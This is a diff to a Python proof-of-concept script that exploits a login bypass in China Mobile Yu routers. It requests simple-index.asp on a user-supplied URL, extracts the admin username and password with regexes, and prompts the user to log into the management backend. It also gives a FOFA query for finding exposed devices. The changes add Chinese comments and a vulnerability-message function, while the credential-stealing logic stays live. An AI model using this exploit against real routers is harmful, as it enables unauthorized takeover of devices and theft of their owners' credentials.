@@ -12,15 +12,21 @@ print("""           .---.               ___                ,---,        ,---,
      \   \ ;   |  ,     .-./  ---`-'   \   \  / `--''      |   ,.'                 |   :    : 
       '---"     `--`---'                `----'             '---'                    \   \  /  
                                                                                      `--`-'  by:return0""")
+#使用的库
 import requests
 import sys
 import re
 
-def main():
+#漏洞信息答应
+def vul_message():
     print("漏洞描述：中国移动 禹路由 simple-index.asp 存在登录绕过，可以查看wifi信息")
     print("漏洞影响:中国移动 禹路由")
     print('fofa语法：title="互联世界 物联未来-登录"')
     print('发出日期：2021.7.5')
+
+#主函数，漏洞验证及测试代码
+def main():
+    
     user_enter = input("请输入中国移动禹路由url地址(请添加协议仅包含域名及端口，80端口可忽略列入：http://www.baidu.com):")
     url = str(user_enter+"/simple-index.asp")
     headers = {
@@ -36,7 +42,10 @@ def main():
     except:
         print("发生异常，请检查url输入是否正确")
         sys.exit()
+
+    #使用正则表达式pattern为正则表达式
     pattern = re.compile(r'var\s+newPD\s+=\s+\"(\S+)\";')
+    #findall括号中的内容为被正则表达式匹配的文本数据
     result_password = pattern.findall(r.text)
     pattern2 = re.compile(r'var\s+newUN\s+=\s+\"(\S+)\";')
     result_username = pattern2.findall(r.text)
@@ -45,4 +54,5 @@ def main():
     print("*获取完毕，请输入账号密码进入管理后台")
     
 if __name__ == "__main__":
+    vul_message()
     main()
